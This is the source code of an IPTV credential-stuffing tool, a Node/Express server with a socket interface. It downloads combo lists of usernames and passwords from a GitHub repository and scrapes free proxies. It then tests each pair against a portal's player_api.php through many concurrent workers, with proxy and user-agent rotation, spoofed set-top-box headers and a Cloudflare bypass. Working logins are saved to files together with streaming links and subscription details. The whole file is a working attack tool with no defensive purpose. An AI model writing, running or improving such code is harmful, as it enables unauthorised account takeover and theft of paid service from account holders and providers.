import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { Server } from "socket.io";
import http from "http";
import axios from "axios";
import { HttpsProxyAgent } from "https-proxy-agent";
import { SocksProxyAgent } from "socks-proxy-agent";
import cloudscraper from "cloudscraper";
import fs from "fs";
import os from "os";

// Common User Agents for rotation
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200/2.1.0 Safari/533.3',
  'okhttp/4.7.1',
  'Dalvik/2.1.0 (Linux; U; Android 14; SM-S24 Build/UP1A)',
];

// Special headers for IPTV portals
const IPTV_HEADERS = {
  'Cookie': 'stb_lang=en; timezone=Europe%2FIstanbul;',
  'X-User-Agent': 'Model: MAG322; Link: Ethernet',
  'Accept': '*/*',
  'Connection': 'Keep-Alive',
  'Accept-Encoding': 'gzip',
};

interface CheckRequest {
  portal: string;
  combo: string[];
  threads: number;
  proxies: string[];
  proxyType: 'http' | 'socks4' | 'socks5' | 'none';
  bypassCloudflare: boolean;
  randomUserAgent: boolean;
  fetchCategories: boolean;
}

interface HitResult {
  username: string;
  password: string;
  created?: string;
  createdTimestamp?: number;
  expiry?: string;
  expiryTimestamp?: number;
  daysLeft?: number;
  activeCons?: string;
  maxCons?: string;
  status?: string;
  realm?: string;
  port?: string;
  timezone?: string;
  outputFormats?: string;
  m3uLink?: string;
  liveCount?: number;
  vodCount?: number;
  seriesCount?: number;
  categories?: string[];
  statusCode?: number;
  proxyUsed?: string;
  // Additional fields for card display
  serverIP?: string;
  vpn?: string;
  isAdult?: boolean;
  ping?: number;
  hostPort?: string;
}

function getStatusColorName(statusCode: number): string {
  if (statusCode === 200) return 'success';
  if (statusCode === 301) return 'redirect';
  if (statusCode === 302) return 'redirect';
  if (statusCode === 403) return 'forbidden';
  if (statusCode === 404) return 'notfound';
  if (statusCode === 407) return 'authrequired';
  if (statusCode === 429) return 'ratelimit';
  if (statusCode === 500) return 'servererror';
  if (statusCode === 503) return 'unavailable';
  if (statusCode === 520) return 'unknown';
  return 'default';
}

function saveMiniHit(hitsDir: string, portalHost: string, content: string): void {
  const miniFile = `${hitsDir}/MINI_HITS_${portalHost}.txt`;
  fs.appendFileSync(miniFile, content);
}

function saveFullHit(hitsDir: string, portalHost: string, content: string): void {
  const fullFile = `${hitsDir}/FULL_HITS_${portalHost}.txt`;
  fs.appendFileSync(fullFile, content);
}

async function startServer() {
  const app = express();
  const httpServer = http.createServer(app);
  const io = new Server(httpServer, { maxHttpBufferSize: 100 * 1024 * 1024 });
  const PORT = parseInt(process.env.PORT || '3000');

  const hitsDir = path.join(os.homedir(), 'M3U_GHOST_Hits');
  if (!fs.existsSync(hitsDir)) {
    fs.mkdirSync(hitsDir, { recursive: true });
  }

  app.use(express.json({ limit: '50mb' }));

  app.get("/api/status", (req, res) => {
    res.json({ running: true, uptime: process.uptime(), memory: process.memoryUsage().rss });
  });

  app.get("/api/hits/:type", (req, res) => {
    const { type } = req.params;
    const portalHost = req.query.portal as string || 'unknown';
    const filename = type === 'mini' 
      ? `MINI_HITS_${portalHost.replace(/[:.]/g, '_')}.txt`
      : `FULL_HITS_${portalHost.replace(/[:.]/g, '_')}.txt`;
    const filepath = path.join(hitsDir, filename);
    
    if (fs.existsSync(filepath)) {
      res.download(filepath);
    } else {
      res.status(404).json({ error: "No hits file found" });
    }
  });

  app.get("/api/fetch-assets", async (req, res) => {
    const { type } = req.query;

    try {
      if (type === 'combo') {
        const repoPath = 'gamba3/Combo-SILENTGHOST-STORAGE';
        const branches = ['main', 'master'];
        const possibleFiles = ['Combo.txt', 'combo.txt', 'Combo_SILENTGHOST.txt', 'LIST.txt'];
        
        let comboData = '';

        for (const branch of branches) {
          for (const file of possibleFiles) {
            try {
              const url = `https://raw.githubusercontent.com/${repoPath}/${branch}/${file}`;
              const response = await axios.get(url, { timeout: 5000 });
              if (response.data && typeof response.data === 'string' && response.data.includes(':')) {
                comboData = response.data;
                break;
              }
            } catch (e) {}
          }
          if (comboData) break;
        }

        if (!comboData) {
          try {
            const apiRes = await axios.get(`https://api.github.com/repos/${repoPath}/contents/`, { 
              timeout: 5000,
              headers: { 'User-Agent': 'Axios-Scanner' }
            });
            if (Array.isArray(apiRes.data)) {
              const txtFiles = apiRes.data.filter((f: any) => f.name.toLowerCase().endsWith('.txt') && f.type === 'file');
              for (const file of txtFiles) {
                try {
                  const response = await axios.get(file.download_url, { timeout: 5000 });
                  if (response.data && typeof response.data === 'string' && response.data.includes(':')) {
                    comboData = response.data;
                    break;
                  }
                } catch (e) {}
              }
            }
          } catch (e) {}
        }

        if (!comboData) {
          return res.status(404).json({ error: "Could not find valid combo list in repository." });
        }
        return res.send(comboData);
      }

      if (type === 'proxy') {
        const proxyUrls = [
          'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&simplified=true',
          'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all',
          'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all',
        ];

        const results = await Promise.allSettled(proxyUrls.map(url => axios.get(url, { timeout: 10000 })));
        let allProxies: string[] = [];

        results.forEach(res => {
          if (res.status === 'fulfilled' && res.value.data) {
            const lines = String(res.value.data).split(/\r?\n/).map(l => l.trim()).filter(l => l.length > 0);
            allProxies = [...allProxies, ...lines];
          }
        });

        const uniqueProxies = Array.from(new Set(allProxies));
        if (uniqueProxies.length === 0) {
          return res.status(404).json({ error: "Failed to fetch any proxies." });
        }
        return res.send(uniqueProxies.join('\n'));
      }

      res.status(400).json({ error: "Invalid asset type" });
    } catch (error: any) {
      res.status(500).json({ error: error.message });
    }
  });

  const cancellations = new Map<string, boolean>();

  io.on("connection", (socket) => {
    console.log(`[SOCKET] Client connected: ${socket.id}`);
    cancellations.set(socket.id, false);

    socket.on("stopCheck", () => {
      console.log(`[SOCKET] Stop requested for ${socket.id}`);
      cancellations.set(socket.id, true);
    });

    socket.on("disconnect", (reason) => {
      console.log(`[SOCKET] Client disconnected: ${socket.id} (${reason})`);
      cancellations.delete(socket.id);
    });

    socket.on("startCheck", async (data: CheckRequest, ack?: (response: any) => void) => {
      try {
        const { portal, combo, threads, proxies, proxyType, bypassCloudflare, randomUserAgent, fetchCategories } = data;
        console.log(`[SOCKET] startCheck received!`);
        console.log(`[SOCKET] Data keys:`, Object.keys(data));
        console.log(`[SOCKET] Combo length:`, combo?.length);
        console.log(`[SOCKET] Portal:`, portal);
        console.log(`[SOCKET] Threads:`, threads);
        if (ack) ack({ received: true, comboLength: combo?.length });
      
      let host = portal.trim().replace(/^https?:\/\//i, '').split('/')[0];
      const portalHost = host.replace(/[:.]/g, '_');
      
      if (!host) {
        socket.emit("finished", { hits: 0, bad: 0, proxyErrors: 0, error: "Invalid Host" });
        return;
      }

      console.log(`[ENGINE] Starting scan for ${host} with ${threads} threads and ${combo.length} accounts`);
      console.log(`[ENGINE] Cloudflare bypass: ${bypassCloudflare}, Categories: ${fetchCategories}`);
      
      let processed = 0;
      let hits = 0;
      let bad = 0;
      let proxyErrors = 0;
      let startTime = Date.now();
      let lastStatusCode = 200;

      let currentIdx = 0;
      const getNextPair = () => {
        if (currentIdx >= combo.length) return null;
        return combo[currentIdx++];
      };

      const proxyPool = [...proxies].filter(p => {
        if (proxyType === 'http') return !p.startsWith('socks');
        if (proxyType === 'socks4') return p.startsWith('socks4://') || p.startsWith('socks4a://');
        if (proxyType === 'socks5') return p.startsWith('socks5://') || p.startsWith('socks://');
        return true;
      });
      const getRandomProxy = () => {
        if (proxyPool.length === 0) return null;
        return proxyPool[Math.floor(Math.random() * proxyPool.length)];
      };

      const getAgent = (proxyStr: string | null) => {
        if (!proxyStr) return null;
        try {
          const url = proxyStr.includes('://') ? proxyStr : `http://${proxyStr}`;
          if (url.startsWith('socks')) {
            return new SocksProxyAgent(url);
          }
          return new HttpsProxyAgent(url);
        } catch (e) {
          return null;
        }
      };

      const makeRequest = async (url: string, timeout = 10000, useProxy = true) => {
        const currentProxy = useProxy && proxyPool.length > 0 ? getRandomProxy() : null;
        const agent = getAgent(currentProxy);
        const ua = randomUserAgent
          ? USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
          : USER_AGENTS[USER_AGENTS.length - 1];
        const headers: any = { ...IPTV_HEADERS, 'User-Agent': ua };
        const response = await axios.get(url, {
          headers,
          httpsAgent: agent,
          httpAgent: agent,
          timeout,
          validateStatus: (s: number) => s < 500
        });
        return { response, proxyUsed: currentProxy || 'Direct', headers };
      };

      const worker = async () => {
        while (true) {
          if (cancellations.get(socket.id)) {
            console.log(`[WORKER] Cancelled for ${socket.id}`);
            break;
          }
          const pair = getNextPair();
          if (!pair) break;

          const parts = pair.split(':');
          if (parts.length < 2) {
            processed++;
            continue;
          }
          
          const user = parts[0].trim();
          const pass = parts.slice(1).join(':').trim();

          let attempt = 0;
          let success = false;
          const maxRetries = proxyPool.length > 50 ? 2 : 2;
          let currentProxy = 'Direct';
          let statusCode = 0;

          while (attempt < maxRetries && !success) {
            try {
              let response: any;

              socket.emit("progress", {
                processed, total: combo.length, hits, bad, cpm: 0,
                percent: Math.round((processed / combo.length) * 100),
                proxyErrors, statusCode: lastStatusCode,
                currentUser: user.substring(0, 12) + '...',
                currentPass: pass.substring(0, 3) + '***'
              });

              const protocols = ['http', 'https'];
              let parsedBody: any = null;
              let ping = 0;
              let usedProto = 'http';

              for (const proto of protocols) {
                try {
                  const testUrl = `${proto}://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
                  usedProto = proto;
                  if (bypassCloudflare) {
                    const ua = randomUserAgent
                      ? USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
                      : USER_AGENTS[USER_AGENTS.length - 1];
                    const headers: any = { ...IPTV_HEADERS, 'User-Agent': ua };
                    const start = Date.now();
                    const body = await cloudscraper.get(testUrl, { headers, timeout: 10000 });
                    ping = Date.now() - start;
                    parsedBody = JSON.parse(body);
                    statusCode = 200;
                    currentProxy = 'Cloudflare';
                  } else {
                    const start = Date.now();
                    const { response: resp, proxyUsed } = await makeRequest(testUrl, 10000, proxyPool.length > 0);
                    ping = Date.now() - start;
                    parsedBody = resp.data;
                    statusCode = resp.status;
                    currentProxy = proxyUsed;
                  }
                  if (parsedBody) break;
                } catch (e: any) {
                  console.log(`[DEBUG] ${proto} failed for ${user}: ${e?.message?.slice(0, 80)}`);
                  if (e?.code === 'ECONNREFUSED' || e?.code === 'ETIMEDOUT' || e?.code === 'ECONNABORTED') {
                    throw e;
                  }
                  continue;
                }
              }

              if (!parsedBody) {
                bad++;
                success = true;
                continue;
              }

              lastStatusCode = statusCode;
              response = { data: parsedBody, _ping: ping };

              const info = parsedBody;

              if (info && info.user_info && String(info.user_info.status).toLowerCase() === 'active') {
                  const userInfo = info.user_info;
                  const serverInfo = info.server_info || {};
                  
                  console.log(`[HIT] ${user}:${pass}`);
                  
                  const activeCons = String(userInfo.active_cons || "0");
                  const maxCons = String(userInfo.max_connections || "0");
                  const status = userInfo.status;
                  const timezone = serverInfo.timezone || '';
                  const realm = serverInfo.url || '';
                  const port = String(serverInfo.port || '');
                  const outputFormats = serverInfo.output_formats || '';
                  
                  let created = 'Unlimited';
                  let expiry = 'Unlimited';
                  let daysLeft: number | undefined = 9999;

                  if (userInfo.created_at && userInfo.created_at !== 'null' && userInfo.created_at !== '0') {
                    created = new Date(parseInt(userInfo.created_at) * 1000).toLocaleString('en-GB');
                  }

                  if (userInfo.exp_date && userInfo.exp_date !== 'null' && userInfo.exp_date !== '0') {
                    expiry = new Date(parseInt(userInfo.exp_date) * 1000).toLocaleString('en-GB');
                    daysLeft = Math.ceil((parseInt(userInfo.exp_date) * 1000 - Date.now()) / (1000 * 60 * 60 * 24));
                  }

                  // Extract server IP from realm URL
                  let serverIP = '';
                  if (realm) {
                    const ipMatch = realm.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
                    if (ipMatch) serverIP = ipMatch[1];
                  }

                  // Host:Port format
                  const hostPort = serverInfo.url ? `${serverInfo.url}:${serverInfo.port || '80'}` : `${host}:${port}`;

                  const result: HitResult = {
                    username: user,
                    password: pass,
                    created,
                    expiry,
                    daysLeft,
                    activeCons,
                    maxCons,
                    status,
                    timezone,
                    realm,
                    port,
                    outputFormats,
                    m3uLink: `${usedProto}://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`,
                    statusCode,
                    proxyUsed: currentProxy,
                    serverIP,
                    hostPort,
                    ping,
                  };

                  hits++;
                  socket.emit("hit", result);

                  (async () => {
                    try {
                      const counts = await Promise.allSettled([
                        makeRequest(`${usedProto}://${host}/player_api.php?username=${user}&password=${pass}&action=get_live_streams`, 5000, proxyPool.length > 0),
                        makeRequest(`${usedProto}://${host}/player_api.php?username=${user}&password=${pass}&action=get_vod_streams`, 5000, proxyPool.length > 0),
                        makeRequest(`${usedProto}://${host}/player_api.php?username=${user}&password=${pass}&action=get_series`, 5000, proxyPool.length > 0),
                      ]);
                      
                      const updatedResult: HitResult = { ...result };
                      if (counts[0].status === 'fulfilled') updatedResult.liveCount = Array.isArray(counts[0].value.response.data) ? counts[0].value.response.data.length : 0;
                      if (counts[1].status === 'fulfilled') updatedResult.vodCount = Array.isArray(counts[1].value.response.data) ? counts[1].value.response.data.length : 0;
                      if (counts[2].status === 'fulfilled') updatedResult.seriesCount = Array.isArray(counts[2].value.response.data) ? counts[2].value.response.data.length : 0;

                      // Fetch VPN info and adult content
                      if (serverIP) {
                        try {
                          const vpnRes = await axios.get(`http://ip-api.com/json/${serverIP}?fields=status,country,query`, { timeout: 5000 });
                          if (vpnRes.data.status === 'success') {
                            updatedResult.vpn = vpnRes.data.country;
                          }
                        } catch (e) {}
                      }

                      // Check for adult content
                      try {
                        const adultRes = await axios.get(`${usedProto}://${host}/player_api.php?username=${user}&password=${pass}&action=get_vod_categories`, { timeout: 5000 });
                        if (Array.isArray(adultRes.data)) {
                          updatedResult.isAdult = adultRes.data.some((cat: any) => 
                            cat.category_name && cat.category_name.toLowerCase().includes('adult')
                          );
                        }
                      } catch (e) {}
                      
                      socket.emit("hitUpdate", updatedResult);

                      const miniContent = `\n[HIT] User: ${user} | Pass: ${pass} | Expiry: ${expiry} | Days: ${daysLeft}\n`;
                      const fullContent = `==========\nHost: ${host}\nUser: ${user}\nPass: ${pass}\nCreated: ${created}\nExpiry: ${expiry}\nActive: ${activeCons}/${maxCons}\nStatus: ${status}\nTimezone: ${timezone}\nM3U: ${result.m3uLink}\n==========\n`;

                      saveMiniHit(hitsDir, portalHost, miniContent);
                      saveFullHit(hitsDir, portalHost, fullContent);
                    } catch (e) {}
                  })();

                success = true;
              } else {
                bad++;
                success = true;
              }
            } catch (error: any) {
              attempt++;
              if (attempt < maxRetries) {
                await new Promise(r => setTimeout(r, 500));
                continue;
              }
              bad++;
              if (error.code === 'ECONNREFUSED' || error.code === 'ETIMEDOUT' || error.code === 'ECONNABORTED') {
                proxyErrors++;
              }
            }
          }

          processed++;
          if (processed % 20 === 0) {
            const elapsed = (Date.now() - startTime) / 1000;
            socket.emit("progress", {
              processed,
              total: combo.length,
              hits,
              bad,
              cpm: Math.round((processed / elapsed) * 60),
              percent: Math.round((processed / combo.length) * 100),
              proxyErrors,
              statusCode: lastStatusCode,
              currentUser: user.substring(0, 10) + '...',
              currentPass: pass.substring(0, 4) + '***'
            });
          }
        }
      };

      const threadCount = Math.min(threads || 1, combo.length, 2000);
      console.log(`[ENGINE] Creating ${threadCount} workers`);
      
      socket.emit("progress", {
        processed: 0,
        total: combo.length,
        hits: 0,
        bad: 0,
        cpm: 0,
        percent: 0,
        proxyErrors: 0,
        statusCode: 200,
        currentUser: 'Starting...',
        currentPass: '***'
      });
      
      await Promise.all(new Array(threadCount).fill(null).map(() => worker()));
      socket.emit("finished", { hits, bad, proxyErrors });
      console.log(`[ENGINE] Done! Hits: ${hits}, Bad: ${bad}`);
      } catch (error: any) {
        console.error(`[ERROR] startCheck crashed:`, error?.message || error);
        socket.emit("finished", { error: `Server error: ${error?.message || 'Unknown'}` });
        socket.emit("progress", { processed: 0, total: 0, hits: 0, bad: 0, cpm: 0, percent: 0, proxyErrors: 0, statusCode: 500, currentUser: 'ERROR', currentPass: '' });
      }
    });
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  httpServer.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();